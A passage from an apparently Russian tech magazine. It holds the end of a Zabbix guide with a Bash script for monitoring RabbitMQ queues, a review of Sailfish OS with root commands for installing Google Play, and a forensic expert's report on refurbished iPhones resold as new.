   разбиваем каждую читаемую строку на две переменные, используя дво‐
   еточие как разделитель.
 7. В этом же цикле начинаем формирова ние списка метрик, отправляемых
   на   сервер    Zabbix,   в   формате   имя_хоста   имя_метрики
   значение_метрики. Все данные складиру ем в файл /etc/zabbix/
   scripts/zamqp_data.list.
 8. После завершения цикла заканчиваем формировать JSON специальным
   значением QUEUENAME (заглушкой, она не будет использоваться), иначе
  JSON получится кривой.
 9. Выдаем JSON в вывод cat.
10. Отправляем все соб ранные мет рики из файла /etc/zabbix/scripts/
   zamqp_data.list на сервер Zabbix, вывод команды перенаправляем
   в файл /etc/zabbix/scripts/zsender.log, чтобы не запороть JSON.

Для написания скрипта я использовал Bash, но ты можешь писать на любом
языке, который тебе ближе. Далее — код скрипта.


#!/bin/bash
ZHOST=`hostname ‐f`
ZSERVER="10.72.5.41"
ZPORT="10051"
truncate ‐s 0 /etc/zabbix/scripts/zsender.log
truncate ‐s 0 /etc/zabbix/scripts/zamqp_vhosts.list
truncate ‐s 0 /etc/zabbix/scripts/zamqp_queues.list
truncate ‐s 0 /etc/zabbix/scripts/zamqp_data.list
cat /dev/null > /etc/zabbix/scripts/zamqp_data.list
sudo /usr/sbin/rabbitmqctl list_vhosts | grep ‐v "Listing vhosts " |
grep ‐v "done." >> /etc/zabbix/scripts/zamqp_vhosts.list
for VHOST in `cat /etc/zabbix/scripts/zamqp_vhosts.list`;
do
sudo /usr/sbin/rabbitmqctl list_queues ‐p $VHOST | grep ‐v "Listing
queues " | grep ‐v "done." | awk '{print $1 ":" $2}' >> /etc/zabbix/
scripts/zamqp_queues.list
done
JSONSTREAM="{ \"data\":[ "
for QUEUE in `cat /etc/zabbix/scripts/zamqp_queues.list`;
do
IFS=':' read ‐a MQARG <<< "$QUEUE"
JSONSTREAM="$JSONSTREAM{ \"{#QUEUENAME}\":\"${MQARG[0]}\" }, "
echo $ZHOST amqp.queue.count[${MQARG[0]}] ${MQARG[1]} >> /etc/zabbix/
scripts/zamqp_data.list
done
JSONSTREAM="$JSONSTREAM{ \"{#QUEUENAME}\":\"ALLQUEUES\" } ]}"
cat << EOF
$JSONSTREAM
EOF
zabbix_sender ‐vv ‐z $ZSERVER ‐p $ZPORT ‐i /etc/zabbix/scripts/zamqp_
data.list >> /etc/zabbix/scripts/zsender.log 2>&1

Как видишь, код не требует глубоких поз наний в программировании. Но ты
можешь его усложнить на свое усмотрение.
   Настроим агент и убедимся, что метрики отправляются на сервер.
Добавим новый поль зовательский параметр в конфигурацию клиента zabbix‐
agent.


$ sudo cat /etc/zabbix/zabbix_agentd.d/userparameter_amqp.conf
UserParameter=amqp.discovery,/etc/zabbix/scripts/zamqpdiscovery.sh

Перезапустим агент и проверим его ста тус.


$ sudo systemctl restart zabbix‐agent; sudo systemctl status
zabbix‐agent

Если все хорошо, то в логе отправки метрик ты увидишь все метрики, ухо‐
дящие на сервер Zabbix.


  $ sudo cat /etc/zabbix/scripts/zsender.log


   zabbix_sender [55803]: DEBUG: answer
  [{"response":"success","info":"processed: 136; failed: 0; total: 136;
  seconds spent: 0.001183"}]
   info from server: "processed: 136; failed: 0; total: 136; seconds
  spent: 0.001183"
   sent: 136; skipped: 0; total: 136


Проверяем, что метрики успешно доходят до сервера. На сервере запус каем
команду zabbix_get. Если на экран будет выведен JSON, значит, все
в порядке. Если нет, то проверяем скрипт хос та на ошиб ки.


$ sudo zabbix_get ‐s <имя хоста> ‐p <порт хоста> ‐k 'amqp.discovery'

На этом настройка мониторин га очередей закончена.


В ЗАВЕРШЕНИЕ
Как ты видишь, автоматизация системы мониторинга не такая уж и сложная
вещь и Zabbix LLD легок и прост в освоении! Никаких сверхспособностей
не требуется, иногда нуж но лишь желание автоматизировать сбор метрик
и чуть‐чуть свободного времени.
   Надеюсь, моя статья поможет тебе с изу чением Zabbix и ты откроешь
для себя новые возможности при настройке мониторинга. А если подсядешь
на эту штуку, то не ленись иногда заг лядывать в документацию по Zabbix. Раз‐
работчики оставили там для тебя много интересного и полез ного.
GEEK
SAILFISH
  КАК ЗАМЕНА
   ANDROID

      ИЗУЧАЕМ ОПЕРАЦИОННУЮ
    СИСТЕМУ, КОТОРАЯ ОСВОБОДИТ
       ТВОЙ ТЕЛЕФОН ОТ ГНЕТА
             GOOGLE





                                       Александр Толстой
                                                 a.a.tolstoy@gmail.com





На рынке мобильных ОС уже много лет доминирует Android,
оставляя значимую нишу только для iOS. Как насчет альтер‐
нативы? В этой статье мы изучим как раз такой вари ант —
мобильную операционную систему Sailﬁsh OS финской ком‐
пании Jolla. Посмотрим, каково это — иметь на телефоне
настоящий Linux (лишенный родовых болячек Nokia N900).


             INFO

                           Sailﬁsh   переводится   как   «рыба‐парусник»,
                       а jolla — это по‐фин ски «лодочка», родственник
                      нашего ялика. Вот такая рыбацкая терминология.


На самом деле у Android есть и другие конкуренты, например Tizen. Но все же
Sailﬁsh — единствен ная система, которую можно установить на некоторые
смартфоны прямо сейчас, плюс Jolla успела выпус тить пару моделей под сво‐
ей маркой, и эти аппараты все еще присутс твуют на рынке.
   Sailﬁsh — это, по сути, пря мой наследник операционки Meego. Эту сис‐
тему ты, возможно, успел увидеть в аппа рате Nokia N9. Meego — полноцен‐
ный Linux, обладающий, помимо ядра, привычным набором компонентов,
таких как Systemd, Pulseaudio и Wayland. Никаких виртуальных Java‐машин,
только хардкор!
   Пользовательская среда — самобытная разработка  Jolla, написанная
на Qt 5 и QML. Управление в Sailﬁsh постро ено на жес тах и касаниях, поэтому
отдельной кнопки Home системе не требуется. Для раз блокировки нужно
дважды коснуться экрана и затем смахнуть его в сторону. Навигация по сис‐
теме строится на свайпах.
  Центральный экран занимает список приложений, который можно пролис‐
тывать. Делаем свайп вниз — вылезает шторка с типами подключений,
небольшой свайп вверх — появляется нижний док с избранными приложе‐
ниями, а если потянуть сильнее — покажется основная сетка приложений.
Пролистывая экраны в стороны, можно переключаться между тре мя основны‐
ми режимами: сеткой приложений, экраном уведомлений и миниатюрами
запущенных задач. Виртуальных рабочих столов, как в Android, тут нет, но к
этому быстро привыкаешь.
   Часть UI написана с использованием Silica — собственного расширения
QML, которое Jolla не отда ет сообществу (так же как и движок «умного» ввода
текста). Все остальное имеет открытый исходный код.





Что касается аппаратов, на которых работает эта ОС, то это Jolla Jolla (sic!),
Jolla C, Inoi R7 (смартфон среднего уровня под отечес твенным брендом)
и несколько региональных моделей, наз вания которых вряд ли тебе что‐то
скажут. М‐да, негусто… Но парни в Jolla вовремя подсуетились и поучаство‐
вали в программе Sony Open Devices. Результатом стало соз дание отдельной
версии Sailﬁsh X для смартфонов Sony Xperia X и XA2. Это уже дру гое дело!
Имея сов ременную «соньку», можно заменить Android на Sailﬁsh и вдохнуть
воздух свободы пол ной грудью… Но, как в анекдоте, тут есть нюанс.


НЮАНСЫ
Ты, конечно, знаешь, что операционка без собс твенной экосистемы при‐
ложений мало чего сто ит. Вокруг Jolla сущес твует сплоченное, но все же
маленькое сообщество, которое потихоньку пилит программы под свою
любимую систему. «Из короб ки» в Sailﬁsh есть неп лохой набор приложе ний,
вклю чая вполне годный веб‐бра узер на Gecko. Но этого, конечно, мало.
   Есть сайт openrepos.net — что‐то вроде COPR в Fedora или OBS в open‐
SUSE. Там можно найти много всего, но качес тво софта… не очень.
  Понимая, что с такими ресурсами на рын ке удержаться невозможно, осно‐
ватели  Jolla договорились со швейцарской компанией Myriad Group AG
о лицензировании их продукта Alien Dalvik — сторонней реализации Android
runtime. Для Sailﬁsh ста ли доступны тысячи приложе ний из мира Android.
Входной барьер низок как никогда: достаточно уметь скачивать файлы APK
по ссылкам из Google Play.
  В итоге, помимо Storeman (клиента для OpenRepos), в системе имеется
полноценный «фирменный» клиент магазина Jolla, где примерно половина
ассортимента помечена значком с роботом — это и есть приложения с An‐
droid. Интеграция с ними максимально бес шовная.





Второй момент, который тоже очень важен, — это наличие в операционной
системе драйверов, позволяющих ей нормально поддерживать сторонние
аппараты со всеми их датчиками и сенсорами. Со вре мен Nokia N9 (а
это 2011 год) упомянутую проблему так никто и не решил, поэтому нативных
драйверов для мобильного железа в Sailﬁsh почти нет.
  Из сложившейся ситуации команда Jolla вышла с помощью libhybris — спе‐
циальной прослой ки, которая позволяет системам на основе GNU C Library
использовать проприетарные драйверы из Android. Libhybris развивается
на GitHub в рамках проекта Mer — форка Meego. Отсюда же рас тут ноги и у
многочисленных сторонних «адаптаций» Mer и Sailﬁsh для таких телефонов,
как OnePlus или Fairphone.
   У Jolla есть официальное руководс тво по сборке собственной версии Sail‐
ﬁsh на практически любом устройстве. Требования такие: разблокированный
загрузчик и работающая кас томная сборка Android, откуда потребу ется
извлечь ядро Linux (Mer поддерживает все, что новее 2.6.35) и бинарные
драйверы Android для периферии. Остальное опи сано в 59‐страничной инс‐
трукции на sailﬁsh.org. Отличное чтение для дол гих зимних вечеров!
   Итак, своих родных драйверов в Sailﬁsh нет, поэто му сейчас самое время
поправить слегка съехавшую шапочку из фольги: да‐да, если ты подозрева‐
ешь наличие низкоуров невой аппа ратной закладки в своем телефоне, то Sail‐
ﬁsh тут не поможет. Но в остальном это более чем годная система, и вот
почему.





ПОЧЕМУ SAILFISH — ЭТО КРУТО
Во‐первых, Alien Dalvik — это очень клевая шту ка, получше, чем Wine в Linux.
Использование андроидных прог рамм не ощущает ся как что‐то инородное,
а приложение Google Services с авториза цией в аккаунте Google вообще соз‐
дает эффект работы на «чистом» Android. Быстро действие отличное, уведом‐
ления интегрируются с основной системой, бес контактные платежи работа‐
ют, жор батареи не наблюда ется. При этом в нас тройках Sailﬁsh есть пункт,
позволяющий отключить весь Alien Dalvik на корню (подозреваю, что через
systemctl). В конце концов, музыкальный плеер, почта, карты и браузер у Sail‐
ﬁsh есть свои, и они неплохо работают.
   Во‐вторых, наконец‐то у тебя появилась сис тема, где рут включается
простым тапом в настройках, пос ле чего ты ста новишься пол ным хозяином
собственного смартфона. Ты можешь зайти на телефон по SSH, скоман‐
довать devel‐su и получить нас тоящую консоль с правами root.





Для управления пакетами тут имеется свой менеджер pkgcon, но в репози‐
ториях есть и zypper, так что если ты когда‐то админил сервак со SLES
или хотя бы рабочую станцию openSUSE, то здесь ты почувс твуешь себя
как дома.


           WARNING

                     Полный доступ к системе означает и то, что неос‐
                      торожная попытка удалить важный пакет может
                        потянуть за собой половину операционки, после
                         чего телефон превращается в кирпич до сле‐
                    дующей перепрошивки.


Третья причина — более низкий порог вхождения для разработчиков. Если ты
уже писал что‐то графичес кое на Qt, то перенести программу в Sailﬁsh сов‐
сем не трудно, тем более что здесь используется декларативный язык QML,
который требует навыков скорее веб‐мас тера, чем классичес кого кодера.
  Но тебе необязательно ста новиться разработчиком, чтобы новая мобиль‐
ная ОС приносила положитель ные эмоции. У Sailﬁsh есть кое‐что еще. Точ‐
нее, нету: в отличие от кастомизированных про изво дителем версий Android
здесь нет неудаляемых приложений, вроде Facebook и «крайне ценных» вен‐
дорских программ. Все как во взрослом дес кто пе: не нужно — значит, сно‐
сим.
   Вот еще одна интересная фиш ка: система не выгружает приложения,
которые висят в фоне. Никогда. Запущен ные задачи не просто отображаются
в виде миниатюр на экране обзора, а действительно работают, у них есть
живые PID. Теоретически выгрузка должна происходить при исчерпании ОЗУ,
но, сколько бы я ни запус кал приложений на своей Jolla C, все они хоть
и начинали в какой‐то момент лагать, однако продолжали работать.


НАСТРАИВАЕМ GOOGLE PLAY
Ты скажешь, что дол жны быть и недос татки. Увы, они есть. Главный источник
головной боли для пользователей Android заключается в том, что жить
без Google Play не осо бо комфортно. Заведется ли он у тебя по чьей‐то
левой инструкции — воп рос открытый. Я сам сталкивался с ситуацией, когда
маркет работает, но не может ничего ска чать, так как «ждет» правильного Wi‐
Fi и не реагирует на изменение соответству ющей настройки.
   Альтернатива всегда есть — это, прежде всего, сторонние маркеты, вклю‐
чая каталог «Яндекса» и магазин самой Jolla. Понят ное дело, там не будет
множества вкусных и полезных программ, и тебе придется почувс твовать
себя старым пиратом, ищущим пра вильно сломанный софт, который не будет
протестовать про тив твоего рутованного (с его точки зре ния) телефона.
  Тем не менее самый удобный вариант — это, конечно же, официальный
гугловский маркет. Для работы с Google Play тебе нужно скачать пакет Gapps
и распаковать содержащиеся в нем файлы APK в папку /opt/alien/system/
priv‐app.
  Затем нужно дать файлам корректные пра ва (#), для чего сначала понадо‐
бится временно остановить Alien Dalvik:


$ devel‐su
$ systemctl stop aliendalvik.service && systemctl mask aliendalvik.
service
$ chmod 664 *.apk
$ systemctl unmask aliendalvik.service  && systemctl start aliend
alvik.service

Затем установи вручную Phonesky  (#  apkd‐install  Phonesky.apk),  и,
в принципе, дальше можно скачать и установить APK для Google Play (нап‐
ример, через apkmirror.com). Годится не любая версия, а конкретная: Google
Play Store 7.3.25. Если пос ле установки дать магазину обновить сам себя, то
все сломается, поэтому сра зу же бло киру ем автообновление:


$ devel‐su
$ touch /data/app/com.android.vending‐2.apk
$ chattr +i /data/app/com.android.vending‐2.apk

Как видишь, ничего сложного. Приятный бонус: тебя не будут донимать бес‐
конечные обновле ния, которые приходят владель цам Android чуть ли не каж‐
дый день. К слову, сама Sailﬁsh обновляется по OTA, примерно раз в два‐три
месяца. Если не брать в расчет мел кие баги, которые присущи любому
небольшому проекту, то единс твенный круп ный недостаток системы —
это малое число поддерживаемых смартфонов.
  По идее, ничто не меша ет оку нуться в мир «адаптаций» libhybris и Mer,
полистать нужные темы на XDA Developers и утя нуть сборку Sailﬁsh для уже
слегка окаменевших аппаратов HTC и Motorola родом из 2015 года. Нужно
новое железо? Тогда только Sony или недос тупный в России смартфон с qw‐
erty‐клавиатурой Gemini PDA. В Jolla, видимо, поняли, что делать собственный
смартфон слишком труд но и дорого, поэтому руководство компании разумно
предпочло кооперировать ся с более круп ными пос тавщиками.
  В итоге у нас есть версия Sailﬁsh X для устрой ств Sony, и, кстати, за нее
просят всего 49 евро (впрочем, есть и бесплатная сборка — без предик‐
тивного ввода и поддержки приложений Android 4.4 и более ранних). Но тут
есть небольшая загвоздка: магазин Jolla позволя ет купить ОС только жителям
Евросоюза. Сайт определяет нахождение клиентов по DNS (см. комментарии
к релизу), но ты наверняка зна ешь, как обойти это ограничение.


ИТОГО
Готов ли ты иногда собирать из комплектующих кровать перед сексом и в
целом слегка выйти из зоны комфорта, которую нам заботливо создали
Google и Apple? Разумеется, ради прекрасной идеи, чувс тва свободы
и атмосферы прик лючений. Если да, то тебя ждет клуб странных, но отчаянных
людей. Если у тебя на десктопе Linux, ты почувству ешь себя как дома.
GEEK
    БЕРИ
       IPHONE!

       КАК ПОД ВИДОМ НОВЫХ АЙФОНОВ
         ПРОДАЮТ ВОССТАНОВЛЕННЫЕ
            ПОЛУРАБОЧИЕ СМАРТФОНЫ





                                         Олег Афонин
                                            Эксперт по мобильной
                                          криминалистике компании
                                               «Элкомсофт»
                                               aoleg@voicecallcentral.com





Для  исследований,  демонстра ции  и  разработки  нам
в «Элкомсофт» приходится ежемесячно приобретать по нес‐
кольку устройств с iOS. Как пра вило, мы стараемся брать
iPhone с умеренно свежим процессором (если не требуется
самая свежая или экзо тическая версия чипсета). Разуме‐
ется, нам тоже хочется сэкономить: если покупка хотя бы
одного iPhone может сказаться на семейном бюджете, то
ежемесячная закупка даже мелких партий устройств — уже
заметная строчка в бюджете компании.


В последние годы в России появилось множество сайтов, которые пытаются
убедить нас в том, что они онлайновые магази ны. Один из каналов продаж
таких сайтов — пло щадка Авито. Как правило, по низкой цене предлагаются
устройства, описанные как «новые, в короб ке, проверка при доставке». Если
тебя удивляет низкая цена (обычно в полтора‐два раза ниже, чем в фир‐
менном магазине  Apple), по телефону тебе сму щенно признаются, что
телефон — «серый» и гарантия будет «от магазина». Что же ты получишь,
если решишься заказать такое устройство? Мы решили поделиться опы том.
Для более полной картины в особо интересных слу чаях мы приводим все дан‐
ные устройств — от точного номера модели до IMEI и серийного номера.
Заодно расскажем, что со всем этим делать, чтобы проверить подлинность
устройства.





IPHONE SE: «НОВЫЙ, В КОРОБКЕ»
Для начала рассмотрим модель iPhone SE, которая в нашей компании поль‐
зуется заслуженной популярностью за отно ситель но све жий процес сор, под‐
держку актуальных версий iOS и компактные раз меры (не то чтобы нас инте‐
ресовало, как он лежит в руке, — просто хранить их тоже где‐то надо). Этих
устройств мы заказали четыре шту ки у разных продавцов. Все они пред‐
лагались в качестве новых «серых» телефо нов.





Ни один из четырех телефо нов не прошел проверку на подлинность. Рас‐
смотрим случайно взятый аппарат (у остальных ситу ация была схожей, отли‐
чались мелкие детали).
 • Устройство: iPhone SE (Space Gray, 16GB)
 • Идентификатор модели (на коробке и в телефоне): MLY52LL/Y (A1662)
 • Серийный номер: F17S3EFRH2XQ
 • IMEI: 355435077179769
 • Официальная цена Apple: уже не продается
 • Цена у операторов/дилеров (из ста рых запасов): 19–20 тысяч рублей
 • Цена официально восстановленного устрой ства: 14–15 тысяч руб лей
 • Цена «нового в коробке»: 11 тысяч рублей

Устройство пришло в похожей на настоящую короб ке, затянутой в качествен‐
ный термопластик. Если одновременно не держать в руках оригинальный
аппарат, то внешний вид упаковки вопросов не вызывает; при сравнении
один в один разница видна невоору женным глазом.
  Проверка идентификатора модели показала, что устройство предназна‐
чено для рынка США и было выпущено для оператора Verizon (с поддержкой
CDMA и модемом Qualcomm). Тем не менее устрой ство комплектовалось
вилкой со стандартным европейским штекером.
   У «нового в коробке» iPhone SE был ненулевой уровень износа аккумуля‐
тора: оставшийся ресурс отображался iOS как 98%.
  Проверка по IMEI и серийному номеру показа ла, что цвет устрой ства —
Gold. Если бы когнитивный диссонанс не возник у нас раньше, то он точно
появился бы теперь: в руках мы держали аппарат в корпусе цвета Space Gray.
  Дополнительная провер ка показа ла дату производства: 02.08.2016. Кроме
того, сайт любезно указал приблизитель ную дату покупки: 14.08.2016.
  К сожалению, все, что нам уда лось увидеть на сайте checkcoverage.apple.‐
com, — это то, что телефон был честно куплен и активирован больше года
назад и что все гарантийные обязательства производителя уже истекли.
  В телефоне была  установлена  свежая  версия  iOS  12.1.2, вышед‐
шая 17 декабря 2018 года. Как эта версия iOS могла оказаться на устройстве,
выпущенном в 2016 году и «лежавшем на складе», — продавец умалчивает.
   То, что серийный номер на короб ке на одну букву отличался от серийного
номера, выданного системой, нас уже совсем не удивило.
   Что же нам досталось в этом случае и как телефон «дошел до жизни
такой»?
  Мы получили аппарат, кус тарным обра зом вос становленный в китай ском
подвале. «Серый импорт» как раз и означает, что российский продавец купил
в Китае партию восстановленных телефонов. Как он попал в Китай? Скорее
всего, телефон был сдан пер воначальным владель цем в trade‐in или продан
с рук за мизерную цену. Устройство вывезли в Китай для восстановления (в
любой другой стране сто имость рабочей силы будет выше стоимости устрой‐
ства). Из оригинального телефона извлекли материнскую плату; вероятно,
выдрали с корнем и датчик Touch ID. Ори гинальность аккумулятора под воп‐
росом, а вот корпус с экра ном продавец точно выб росил и заменил непопу‐
лярный золотой цвет на ходовой серый. Пос коль ку продажа планировалась
в России, в короб ку положили поддельную вилку‐зарядку и под дельный же
кабель  Lightning  (в некоторых случаях телефоны отказываются работать
с такими «коробоч ными» шнурками пос ле уста новки обновле ния). Коробку
напечатали в ближайшей типографии и затяну ли в пленку на недорогом стан‐
ке.


ЕЩЕ ДВА IPHONE SE
Ниже — детали еще двух аппа ратов iPhone SE. Попробуем опре делить, что
с ними не так.


Устройство 1
 • Модель: iPhone SE 64GB MLM62VC/C (A1723)
 • Цвет: Space Gray
 • Serial: C39R5324H2XH
 • IMEI: 355441070436735
 • iOS 11.2.2 (15C202)
 • Состояние аккумулятора: 99%

Проверка модели показывает, что устрой ство предназначено для канадского
рынка.
   Цвет и объем накопителя соответству ют заявленным. Проверка гарантий‐
ных обязательств через checkcoverage.apple.com показала, что телефон был
приобретен и активирован более года назад; гарантийные обязательства
производителя истекли.
  Проверяем IMEI и выяс няем, что телефон произведен более трех лет
назад. При этом iOS 11.2.2 (15C202) появилась лишь 8 января 2018 года;
именно в этот день телефон был в последний раз обновлен оригинальным
владельцем. К нам он попал именно с этой версией iOS. Состояние акку муля‐
тора в 99% после трех лет использования позволя ет предположить, что акку‐
мулятор был  заменен. Вердикт:  восста новленный  в подвале  аппарат,
выпущенный более трех лет назад.


Устройство 2
 • Модель: iPhone SE 16GB FLLN2RU/A (A1723)
 • Цвет: Space Gray
 • Serial: FRGWR1NPH2XJ
 • IMEI: 353066096545029
 • Текущая версия iOS 12.1.1 (16B92) (обновление установлено в нашей
   лаборатории)

Впервые нам попалось действительно честно восстановленное устрой ство,
предназначенное имен но для рос сийского рын ка!
  Номер модели, начинающийся с F, указыва ет, что телефон был восстанов‐
лен в авторизованном сервисе Apple, а две буквы RU допол няют, что устрой‐
ство предназначено именно для россий ского рынка. Проверка гарантийных
обязательств Apple по серийному номеру показы вает, что мы были первыми,
кто активировал устройство в октябре 2018 года, и у нас есть остаток гаран‐
тии, действительный до 6 октября 2019‐го. Именно так и должны выглядеть
«честные» восстановленные телефо ны. К сожалению, у нас не сохранилось
информации о том, какая версия iOS была в устройстве «из коробки»; iOS
12.1.1 мы установили самос тоятельно нес колько недель назад, так как имен‐
но эта версия — одна из пос ледних, для которой был доступен обнаруженный
Google Project Zero экспло ит.
   Успех? Почти: этот телефон был — единс твенный! — куплен в офи циаль‐
ной рознице «Мегафон» в качестве нового, без помет ки «восстановленный».


IPHONE 7 (RED, 128 ГБАЙТ) — «ГАРАНТИЯ ОТ ОДНОГО ГОДА!»
Следующим устрой ством стал iPhone 7; именно такой аппарат потребовался
для отладки работы утилиты, извлекающей образ файловой системы устрой‐
ства без модификации системного раздела.
  Через несколько часов после заказа нам дос тавили устройство, обла‐
дающее следующими характеристиками.
 • Model: MNAM2LL/A (A1660)
 • Serial: F71S75EZHG74
 • IMEI: 359127072148594
 • Официальная цена Apple: 48,803 тысячи руб лей (цена другого цвета;
   в России красные аппараты официально не продаются)
 • Цена у операторов/дилеров: от 38 тысяч рублей
 • Цена «нового в коробке»: 21,9 тысячи руб лей

Курьер привез телефон, упа кованный откровенно небрежно. Вероятно,
у работника на фабрике Apple была третья смена без отдыха.
   Так же как и в случае с iPhone SE, модель определилась как Verizon (соот‐
ветственно, CDMA и модем Qualcomm); более точно — «iPhone 7 128GB Rose
Gold». Вилка в комплек те европейская.
   Уровень износа акку мулятора зашкаливал: оставшийся ресурс — 79%.
Оригинальные аккумуляторы Apple теря ют емкость достаточно равномерно;
20% ресурса вырабатываются за 500–700 полных циклов заряда‐разряда.
Поскольку один пол ный цикл учитывается системой при использовании 100%
емкости (или один цикл заряда с 0 до 100%, или два с 50 до 100%, или три
с 77 до 100%), можем с уверенностью предположить, что «новый в коробке»
телефон был в активном использовании от полуто ра до двух лет.
  Проверка по IMEI и идентифика тору модели однозначно показала цвет
устройства Rose Gold. Конечно, похоже на красный, но все‐таки не совсем.
  Дата производства определяется как 30.08.2016; время первой активации
выяснить не удалось.
  На устройстве была уста новлена iOS 12.1.1 (как раз то, что требовалось
для отладки обнаруженного Google Project Zero эксплоита). Нужно ли объ‐
яснять, что в августе 2016‐го, когда устройство выпустили, iOS 12 не было
даже в проекте?
  Серийный номер, указанный на коробке, отличается от того, который
выдает iOS. Честно говоря, нам трудно себе предста вить целевую аудиторию,
которая будет за свои деньги покупать телефоны меньше чем за половину
официальной цены. Наш случай — исключение; все, что нам нужно, —
это работающая материнская плата и функционирующий разъем Lightning.
Но покупать такое для личного использования вряд ли будет оправданным
риском.


IPHONE 7 (СЕРЕБРИСТЫЙ)
Этот iPhone — одно из недавно купленных устройств, которые мы используем
для отладки утилит низкоуровневого доступа. Разумеется, «новый в коробке».
  На руках: iPhone 7 Silver 32GB.
 • Model: MNC22L/A (A1660)
 • Serial: F72V209ZHG70
 • IMEI: 355830088157749
 • Серийный номер на короб ке соответству ет тому, который сообщает iOS

Смотри, какой замечательный результат нам выдает проверка гарантийных
обязательств Apple по серийному номеру.





Проверим в американской версии сервиса.





Видно, что телефон был чес тно куплен и активирован в США более года
назад; гарантия уже закончилась. Результат про верки по IMEI не хуже.





Уже интересно: выпущен телефон был в корпусе «розовое золото», а на руках
у нас модель в серебристом цвете.
  Наконец, посмотрим, что собой представляет модель MNC22L/A (A1660).
По информации techwalls.com, модель предназна чена для американского
CDMA‐опе ратора Sprint. Дополнитель ная проверка через Sprint подтвержда‐
ет операторский статус модели.
 • Carrier : Sprint MVNO USA
 • ICCID : 89011201000553721695
 • Network GSMA: Clean

В сухом остатке: «новый в коробке» iPhone 7 произведен один год и семь
месяцев назад; был приобретен у американско го оператора Sprint, активиро‐
ван более года назад (гарантия закончилась). Телефон был отвя зан от опе‐
ратора. Попав  в  руки  китайских умельцев,  устройство поменяло  цвет
с непопулярного розового на ходовой сереб ристый. Телефон был укомплек‐
тован европейской вилкой и продан в Рос сии как «новый в коробке». Упаков‐
ка, кстати, была действительно новая.


                                     Продолжение статьи →
GEEK                ← НАЧАЛО СТАТЬИ
       БЕРИ IPHONE!
                  КАК ПОД ВИДОМ НОВЫХ АЙФОНОВ
                  ПРОДАЮТ ВОССТАНОВЛЕННЫЕ
                      ПОЛУРАБОЧИЕ СМАРТФОНЫ





СТАТИСТИКА
Две партии устрой ств, описанных выше, можно было бы списать на случай‐
ность. Но вот что произош ло во время проведения тре нинга в Англии.
  Перед нами стояла задача обеспечить каждого из двенадцати участников
тренинга телефоном iPhone 5s. Участники должны были модифицировать
системный раздел устройства, а это дорога в один конец (после нее — толь‐
ко восстановление сис темы на акту альную версию iOS, для которой у нас
не было припасено уязвимостей). Соот ветс твенно, нам подошло бы не каж‐
дое устройство, а только те, которые работали на одной из вполне конкрет‐
ных версий iOS. Если перенестись в современные реалии, то нам потребова‐
лась бы партия самых дешевых, одноразовых iPhone, на которых была бы
установлена iOS 12.0–12.1.2, не старше и не новее. (На тот момент нам тре‐
бовались соответствующие версии iOS 10.) Просто пойти в магазин и купить,
к сожалению, не вариант; обновить iOS, как ты зна ешь, можно исключительно
до одной из тех вер сий, которые серверы Apple продолжают подписывать.
  После долгих обзвонов мы нашли продавцов, каждый из которых смог
поставить по три‐четыре запечатанные коробки с «новыми» iPhone  5s,
работающими на нужной нам вер сии операционной системы. В общей слож‐
ности мы получили пятнадцать устройств.
  Ни одно из них не прошло проверку подлиннос ти. Абсолютно все были
восстановлены «подвальным» способом. Один из пятнадцати телефонов
отказал еще до того, как мы смогли его настро ить. Еще в одном разъем Light‐
ning работал на зарядку, но не работал в режиме обме на данными. Еще на
одном не действовал дат чик отпечатков пальцев (впрочем, датчик и не был
нужен для нашей цели). Еще на одном телефоне наб людал ся странный сим‐
птом: телефон распознавался компьюте ром, но обмен  криптоключами
с целью создания pairing record заканчивался ошиб кой.
  В половине устрой ств стояли дешевые экраны, а один и вовсе отличился:
вместо оле офобного покрытия китайцы умудрились нанести «олеофиль‐
ное» — равномерно про вес ти пальцем по дисплею было решительно невоз‐
можно. Из пят надцати устройств условно работоспособными оказалось
одиннадцать. Еще один телефон нам пришлось выдавать из собственного
фонда.


ОТЗЫВЫ ПОКУПАТЕЛЕЙ
Особый восторг вызывает чтение отзывов «довольных покупателей» подоб‐
ных устройств. Я тща тельно сохранил ори гинальную орфографию. Нас‐
лаждайся!



      Ну не знаю. Мне повез ло вроде. Раз ве что по мелочи. Перес тала
      работать боковая кноп ка. И нем ного хре пит вер хний динамик. С аппа-
      ратом хожу уже 5 месяц.

Отпечаток пальца? Да зачем.



      Взял в итоге я его, в принципе работа ет без нарека ний, проблем
      с обновле нием нет, единс твенное что не работа ет - тачайди, вмес то
      оригинальной кноп ки стоит фальш кноп ка home (под отпе чаток). Что-
     бы работал отпе чаток (китайской кноп ки) нужен джайл брейк, но с
     ним с некоторыми приложе ниями есть проблема, нап ример сбер банк
      мобайл не работа ет на раз лоченых айфонах. Поэтому сейчас не поль-
      зуюсь отпе чатком, да и не нужен он сов сем. Прежде чем покупать,
      проверил телефон на кас се во всех воз можных сер висах. "Зверь"
      пробива ется без проблем.

Некоторым везет получить «почти не Китай».



     Из китайского в аппа рате стоит только модуль зарядки, кноп ка с отпе-
       чатком. Остальные все оригинал, дис плей тоже оригинальный. Так что
      покупайте на свой страх и риск. Гру бо говоря это "вос ста нов ленная"
      модель "вос ста нов ленного телефона".

Знай, что «прям с завода» Apple производит айфоны, не работающие
на морозе. Но поможет отключение температурного датчика (?) на задней
панели корпуса (??):



     В работе норм, не жалу юсь, из глю ков отклю чается на морозе, приш-
      лось разобрать и снять тем ператур ный датчик на зад ней панели кор-
       пуса, но эта проблема на многих зверьках, даже с завода.

С точки зрения поль зователей, в отка зе дат чика Touch ID виновата, конечно,
компания Apple, а никак не собственное страстное желание сэкономить
любой ценой. Теперь тебе придется жить со знанием, что «по вай‐фаю прос‐
то плохо встает ПО»:



      Вот нас чет полом ки пос ле обновле ния.у меня тач сломался прос то
      на ров ном мес те,ночью пос тавил на заряд ку ,утром прос нулся -не
      работа ет,виню я прошив ку ,более того ,опе ратор тех поддер жки АПЛ
       так же советовал вос ста новить обнову мол скорее все го криво вста-
      ла,но все попытки вер нуть тач были тщетны .и я свой 5s продал
      по дешев ке прияте лю,так как гарантия дав но закончилась .так что есть
      такие люди как я ,у которых действительно сломался Только тач ай
      ди)и есть кри вые обновле ния ,ну как кривые ,в большинс тве слу чаев
      по вай‑фаю прос то плохо вста ет ПО


ЧТО ТАКОЕ REFURBISHED BY APPLE
Некоторые продавцы утверждают, что их телефоны были вос становлены
в официальном сервисном центре. Это всег да ложь. Ни один сервисный
центр Apple в России не занимается восста новлением телефонов. Все
устройства refurbished by Apple получают новый идентификатор модели (если
устройство восстановлено на фабрике Apple, модель должна начинаться
на N, если сторонним, но авторизованным сервисом — на F). Если же иден‐
тификатор модели начина ется на M, то перед нами устройство, которое было
продано в качестве «нового».


